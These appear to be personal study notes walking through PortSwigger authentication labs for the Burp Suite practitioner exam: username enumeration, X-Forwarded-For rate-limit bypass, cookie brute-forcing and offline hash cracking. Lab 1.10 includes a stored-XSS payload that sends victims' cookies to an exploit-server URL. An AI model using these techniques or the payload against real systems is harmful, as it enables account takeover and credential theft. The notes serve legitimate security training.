## Stage 1 + 2
[Github Guide: Brute Force](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#brute-force)
### What is it?
This is under **Authentication vulnerabilities**. Authentication is the process of verifying the identity of a user or client.

### Identify Vulnerabilities in Exam
- "Invalid username"
	- [[Brute Force#1.1 Lab Username enumeration via different responses ⭕️]]
- Valid username + long password = long response time; short password = short response time
	- [[Brute Force#1.5. Lab Username enumeration via response timing ⭕️]]
- `stay-logged-in` cookie has user creds base64 encoded
	- [[Brute Force#1.9. Lab Brute-forcing a stay-logged-in cookie ⭕️]]
	- [[Brute Force#1.10. Lab Offline password cracking ⭕️]]



- - - 
#### 1.1 Lab: Username enumeration via different responses ⭕️
This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

>Another scenario to identify valid username on the WEB APP is to provide list of usernames on login and one invalid password value. In the Intruder attack results one response will contain message `Incorrect password`. #ExamTip 

1. Provide a set of arbitrary username + password then send the request to Repeater. Keep note of the `Invalid username` error message. Send to Intruder. Set username as a position and grep extract that error message.
![[Brute Force-20251103203718658.png]]

2. Sort the grep extract column and notice the `ak` username gave a `Incorrect password` error message. This means `ak` is the correct email. Back to Intruder, clear positions, add password as a position, paste in candidate passwords, and start attack.
3. Got the password `123qwe`. Right click > request in browser > in current browser session and solved.
![[Brute Force-20251103204107179.png|248]]
- - -

#### 1.4. Lab: Username enumeration via subtly different responses ⭕️
This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: ^n2viid
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
> _**Identify**_ that the login page & password reset is not protected by brute force attack, and no IP block or time-out enforced for invalid username or password.

> Tip for the BSCP Exam, there is sometimes another user with weak password that can be brute forced. Carlos is not always the account to target to give a foothold access in stage 1. #ExamTip 

> In the BSCP exam _**lookout**_ for other messages returned that are different and disclose valid accounts on the application and allow the brute force _**identified**_ of account passwords, such as example on the [refresh password reset](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#refresh-password-broken-logic) function.

> Once valid username identified from different response message, the perform [brute force](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#brute-force) using Burp Intruder on the password.

1. Login with arbitrary creds, add the username as a position, then paste in the candidate username list. Settings > Grep - Extract > Add > highlight `Invalid username or password.` (Highlight the period too, pretty important). **Sniper attack**. Start attack.
![[Brute Force-20251103202710652.png|414]]
![[Brute Force-20251103202728155.png|408]]

2. Sort the grep column and notice the `as400` username has a slight different error message: the period is missing. This could be our valid username.
![[Brute Force-20251103203039206.png]]

3. Clear positions, add the password as a position, start attack. Sort the status code column and see the valid password because of the 302 code. Notice that the `Invalid username or password` error message doesn't exist because these are the correct creds. Request in browser > current session and solved.
![[Brute Force-20251103203203564.png]]
- - - 

#### 1.5. Lab: Username enumeration via response timing ⭕️
This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
- Your credentials: `wiener:peter`
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
Hint: To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.

>Definitely cannot try this on a client pentest because brute forcing might bring their site down. Unless we have permission to brute force.

1. Enter some invalid usernames and passwords and then will get a lockout. Even using the correct credentials `wiener:peter` won't be able to login. They're probably using an IP-based brute force protection.
![[Brute Force-20251029215940479.png|352]]

2. Can use the `X-Forwarded-For` header to spoof the IP to bypass the IP-based brute force protection so we can continue to try to brute force credentials. We now see "Invalid username or password" instead of "Please try again in 30 minute(s)".
![[Brute Force-20251029222152496.png|450]]
>[!info] What does `X-Forwarded-For` do?
>It identifies the originating IP address of the client. Means it can let you spoof your IP address.

3. Notice that when you use an invalid username, the response time is roughly similar. But when you use a **valid username**, the response time takes longer -- relative to the length of the password. **Long password == long response time**. 
   This means the server *doesn't bother to check the password* if the username is invalid. The server *takes longer to process* a request with a valid username because it's validating whether the password is correct or not. 
![[Brute Force-20251103200459032.png]]
*valid username, short password*

![[Brute Force-20251103200544564.png]]
*valid username, long password*
>[!tip] Use this in a Real Pentest
>Can use this in a real pentest for Username Enumeration! #Useful 

4. Send request to Intruder, enter a long password, use Pitchfork, add the last digit for `X-Forwarded-For` and add the username. For Payload position 1 set the payload type to Numbers and just make sure the payload count `101` matches the count for Payload position 2 (usernames).
![[Brute Force-20251029223313430.png|497]]
![[Brute Force-20251029223507334.png|174]]

5. The username `albuquerque` received the longest response out of the list so this must be the valid username. Now use the same technique to find the correct password. Looking for a status code of 302 aka a redirection to the authenticated landing page. So keep the first position for the `X-Forwarded-For` header but now add the password position and use the [candidate passwords list](https://portswigger.net/web-security/authentication/auth-lab-passwords).
![[Brute Force-20251103200938086.png]]
![[Brute Force-20251103201329162.png]]

6. The password is `love`. Go to Repeater put in the correct credentials and maybe have to adjust the `X-Forwarded-For` header. Send. Right click > request in browser > in current session and solved.
![[Brute Force-20251103201522207.png]]
![[Brute Force-20251103201613670.png]]
- - - 

#### 1.9. Lab: Brute-forcing a stay-logged-in cookie ⭕️
This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
To solve the lab, brute-force Carlos's cookie to gain access to his **My account** page.
- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. Login as `wiener:peter` and check Stay logged in. Check the `GET /my-account` request and highlight the `stay-logged-in` cookie. See that it is Base64 encoded. Use something like `name-that-hash` cli tool or something online to check the hash algorithm of that `51d...` random string. MD5. The way it is configured: `wiener:51d..` we can guess that these are the credentials and `51d...` is the password hash. To determine this, hash `peter` with MD5 and check: `md5 -s "peter"`. Confirm that it matches.
**Alternative to the cli method**: use https://crackstation.net. 
![[Brute Force-20251028211504533.png]]
![[Brute Force-20251028211404498.png|493]]
![[Brute Force-20251028212013244.png|312]]

2. Logout. Send `GET /my-account` Intruder (remove `?id=weiner`), select the `stay-logged-in` cookie as the position, delete the value for `session` because we want the web app to assign a new `session` cookie. Paste the passwords from the link portswigger gave. Payload processing: Hash: `MD5`, Add Prefix: `carlos:`, Encode: `Base64-encode`. Start attack.
![[Brute Force-20251028213205395.png]]

3. Sort by the status code and get one 200 OK. Lab solved. To gain access to the carlos as if we are authenticated, right click on the request > request in browser > in the original session then paste the link in the browser.
![[Brute Force-20251028213322139.png|296]]
- - -
#### 1.10. Lab: Offline password cracking ⭕️
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
- Your credentials: `wiener:peter`
- Victim's username: `carlos`

1. Login as `wiener:peter` and check Stay logged in. Since the comment section has a stored XSS vulnerability, put this payload in to grab the victim's cookies.
**PAYLOAD**
```
<script>
document.location='https://<YOUR_EXPLOIT_ID>.net/StealCookie='+document.cookie
</script>
```

2. Check the Access Log and got a hit. Put that into decoder and decode as base64. Then throw the hash into https://crackstation.net or use a cli tool like `hashcat` to crack the hash.
![[Brute Force-20251028220949131.png]]
![[Brute Force-20251028221015972.png|467]]
![[Brute Force-20251028221121966.png]]

3. Use `carlos:onceuponatime` to login and then delete the account and solved.
- - - 

